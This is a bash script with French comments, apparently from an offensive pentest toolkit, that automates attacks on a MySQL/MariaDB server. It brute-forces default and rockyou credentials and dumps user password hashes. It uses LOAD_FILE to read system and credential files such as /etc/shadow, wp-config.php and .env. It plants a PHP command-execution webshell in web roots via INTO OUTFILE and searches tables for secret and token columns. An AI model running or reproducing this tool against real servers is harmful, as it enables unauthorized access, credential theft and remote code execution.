#!/usr/bin/env bash
# ╔══════════════════════════════════════╗
# ║   Auto-Enum — MySQL/MariaDB (3306)  ║
# ║   Usage: ./enum_mysql.sh <TARGET> [USER] [PASS]
# ╚══════════════════════════════════════╝
source "$(dirname "$0")/lib/common.sh"

TARGET="$1"
USER="${2:-root}"
PASS="${3:-}"

require_target "$TARGET"
banner "MySQL / MariaDB (port 3306)" "$TARGET"
OUTDIR=$(setup_outdir "$TARGET" "mysql")

if ! check_tool mysql; then
    error "mysql client non trouvé — installer avec: apt install mysql-client"
    exit 1
fi

# ─── 1. FINGERPRINT ─────────────────────────────────────────
section "1. FINGERPRINT"

run "Nmap — version + scripts MySQL" "$OUTDIR/nmap_mysql.txt" \
    nmap "$TARGET" -sV -sC -p3306 --script mysql* \
    -oN "$OUTDIR/nmap_mysql_raw.txt"

# Extraire version
MYSQL_VER=$(grep -oP 'MySQL\s+[\d.]+|MariaDB\s+[\d.]+' "$OUTDIR/nmap_mysql.txt" 2>/dev/null | head -1)
[[ -n "$MYSQL_VER" ]] && finding "Serveur : $MYSQL_VER"

# Check vulns nmap
if grep -qi "VULNERABLE\|empty.password\|anonymous" "$OUTDIR/nmap_mysql.txt" 2>/dev/null; then
    warn "Vulnérabilité ou empty password détecté par nmap !"
fi

# ─── 2. BRUTE FORCE AUTH ────────────────────────────────────
section "2. BRUTE FORCE AUTHENTIFICATION"

DEFAULT_CREDS=(
    "root:"
    "root:root"
    "root:mysql"
    "root:password"
    "root:toor"
    "root:123456"
    "admin:admin"
    "admin:password"
    "mysql:mysql"
)

> "$OUTDIR/valid_creds.txt"
for cred in "${DEFAULT_CREDS[@]}"; do
    u="${cred%%:*}"
    p="${cred##*:}"
    info "Test $u:${p:-<empty>}"
    RESULT=$(timeout 5 mysql -h "$TARGET" -u "$u" --password="$p" \
        -e "SELECT 1;" 2>&1)
    if echo "$RESULT" | grep -q "^1$\|^| 1 |"; then
        success "ACCÈS TROUVÉ : $u:${p:-<empty>}"
        echo "$u:$p" >> "$OUTDIR/valid_creds.txt"
        [[ -z "$PASS" ]] && { USER="$u"; PASS="$p"; }
        break
    fi
done

if [[ -n "$USER" && -z "$(cat $OUTDIR/valid_creds.txt 2>/dev/null)" ]]; then
    info "Test credentials fournis : $USER:$PASS"
    RESULT=$(timeout 5 mysql -h "$TARGET" -u "$USER" --password="$PASS" \
        -e "SELECT 1;" 2>&1)
    if echo "$RESULT" | grep -q "^1$\|^| 1 |"; then
        success "CONNEXION RÉUSSIE : $USER:$PASS"
        echo "$USER:$PASS" >> "$OUTDIR/valid_creds.txt"
    else
        error "Connexion échouée"
    fi
fi

# Hydra bruteforce si toujours rien
if [[ ! -s "$OUTDIR/valid_creds.txt" ]] && check_tool hydra; then
    warn "Brute force Hydra (timeout 90s)"
    run_long "Hydra MySQL" "$OUTDIR/hydra.txt" 90 \
        hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 "$TARGET" mysql
    grep "login:\|password:" "$OUTDIR/hydra.txt" 2>/dev/null | tee -a "$OUTDIR/valid_creds.txt"
fi

# ─── 3. ÉNUMÉRATION POST-CONNEXION ──────────────────────────
if [[ -s "$OUTDIR/valid_creds.txt" ]]; then
    # Utiliser les premiers creds valides
    VALID_LINE=$(head -1 "$OUTDIR/valid_creds.txt")
    USER="${VALID_LINE%%:*}"
    PASS="${VALID_LINE##*:}"

    section "3. ÉNUMÉRATION POST-CONNEXION ($USER)"

    MYSQL_CMD="mysql -h $TARGET -u $USER --password=$PASS --batch --silent"

    # Databases
    info "Listing bases de données"
    $MYSQL_CMD -e "SHOW DATABASES;" 2>&1 | tee "$OUTDIR/databases.txt"

    # Variables intéressantes
    info "Variables système clés"
    $MYSQL_CMD -e "
        SELECT @@version;
        SELECT @@hostname;
        SELECT @@datadir;
        SELECT @@secure_file_priv;
        SELECT user();" 2>&1 | tee "$OUTDIR/system_vars.txt"

    SECURE_FILE=$(grep -oP "(?<=secure_file_priv\s{1,10})\S+" "$OUTDIR/system_vars.txt" 2>/dev/null | head -1)
    if [[ -z "$SECURE_FILE" ]] || [[ "$SECURE_FILE" == "NULL" ]]; then
        finding "secure_file_priv = VIDE → lecture/écriture fichiers libre !"
        echo "FILE_PRIV_OPEN" >> "$OUTDIR/findings.txt"
    else
        info "secure_file_priv = $SECURE_FILE"
    fi

    # Utilisateurs MySQL
    info "Utilisateurs MySQL + hashes"
    $MYSQL_CMD -e "SELECT user, host, authentication_string FROM mysql.user;" \
        2>&1 | tee "$OUTDIR/mysql_users.txt"

    # Grants
    $MYSQL_CMD -e "SHOW GRANTS FOR CURRENT_USER();" 2>&1 | tee "$OUTDIR/grants.txt"
    if grep -qi "FILE\|ALL PRIVILEGES" "$OUTDIR/grants.txt" 2>/dev/null; then
        finding "Privilege FILE ou ALL PRIVILEGES détecté !"
    fi

    # ─── 4. FILE READ ───────────────────────────────────────
    section "4. LECTURE DE FICHIERS (si FILE privilege)"

    if grep -qi "FILE\|ALL PRIVILEGES" "$OUTDIR/grants.txt" 2>/dev/null; then
        for FILE in /etc/passwd /etc/shadow /etc/hosts /var/www/html/config.php \
                    /var/www/html/wp-config.php /var/www/html/.env \
                    "C:/Windows/win.ini" "C:/xampp/htdocs/config.php"; do
            info "Lecture : $FILE"
            CONTENT=$($MYSQL_CMD -e "SELECT LOAD_FILE('$FILE');" 2>&1)
            if echo "$CONTENT" | grep -qv "^NULL$\|^$"; then
                success "FICHIER LU : $FILE"
                echo "=== $FILE ===" >> "$OUTDIR/files_read.txt"
                echo "$CONTENT" >> "$OUTDIR/files_read.txt"
                finding "Contenu de $FILE récupéré !"
            fi
        done
    else
        warn "Privilege FILE non détecté — lecture fichiers impossible"
    fi

    # ─── 5. WEBSHELL (FILE WRITE) ───────────────────────────
    section "5. WEBSHELL VIA INTO OUTFILE"

    if [[ -s "$OUTDIR/findings.txt" ]] && grep -q "FILE_PRIV_OPEN" "$OUTDIR/findings.txt"; then
        for WEBROOT in "/var/www/html" "/var/www" "/srv/www/htdocs" \
                       "/usr/share/nginx/html" "C:/xampp/htdocs" "C:/inetpub/wwwroot"; do
            info "Test écriture dans $WEBROOT"
            SHELL_PATH="${WEBROOT}/sh3ll_$(date +%s).php"
            WRITE_TEST=$($MYSQL_CMD -e \
                "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '$SHELL_PATH';" 2>&1)
            if ! echo "$WRITE_TEST" | grep -qi "ERROR\|denied"; then
                success "WEBSHELL ÉCRIT : $SHELL_PATH"
                finding "RCE possible via : http://$TARGET/sh3ll_*.php?cmd=id"
                echo "$SHELL_PATH" >> "$OUTDIR/webshell_paths.txt"
                break
            fi
        done
    fi

    # ─── 6. DONNÉES SENSIBLES ───────────────────────────────
    section "6. DONNÉES SENSIBLES DANS LES TABLES"

    while IFS= read -r db; do
        [[ "$db" =~ information_schema|performance_schema|mysql|sys ]] && continue
        info "Analyse base : $db"

        # Tables avec colonnes sensibles
        $MYSQL_CMD -e "
            SELECT TABLE_NAME, COLUMN_NAME
            FROM information_schema.COLUMNS
            WHERE TABLE_SCHEMA = '$db'
            AND (COLUMN_NAME LIKE '%pass%'
              OR COLUMN_NAME LIKE '%secret%'
              OR COLUMN_NAME LIKE '%token%'
              OR COLUMN_NAME LIKE '%pwd%'
              OR COLUMN_NAME LIKE '%hash%'
              OR COLUMN_NAME LIKE '%cred%');" 2>&1 | tee -a "$OUTDIR/sensitive_columns.txt"
    done < <(grep -v "^Database\|information_schema\|performance_schema\|mysql\|sys" \
        "$OUTDIR/databases.txt" 2>/dev/null)

    if [[ -s "$OUTDIR/sensitive_columns.txt" ]]; then
        finding "Colonnes sensibles trouvées dans les bases !"
        cat "$OUTDIR/sensitive_columns.txt"
    fi
fi

# ─── SUMMARY ────────────────────────────────────────────────
summary "$OUTDIR"

echo -e "${WHITE}━━━ RÉSUMÉ RAPIDE ━━━${NC}"
[[ -n "$MYSQL_VER" ]] && info "Serveur : $MYSQL_VER"

[[ -s "$OUTDIR/valid_creds.txt" ]] && {
    success "Credentials valides :"
    cat "$OUTDIR/valid_creds.txt"
}

[[ -s "$OUTDIR/findings.txt" ]] && {
    echo ""
    warn "FINDINGS IMPORTANTS :"
    cat "$OUTDIR/findings.txt"
}

[[ -s "$OUTDIR/webshell_paths.txt" ]] && {
    echo ""
    success "WEBSHELLS DÉPLOYÉS :"
    cat "$OUTDIR/webshell_paths.txt"
}
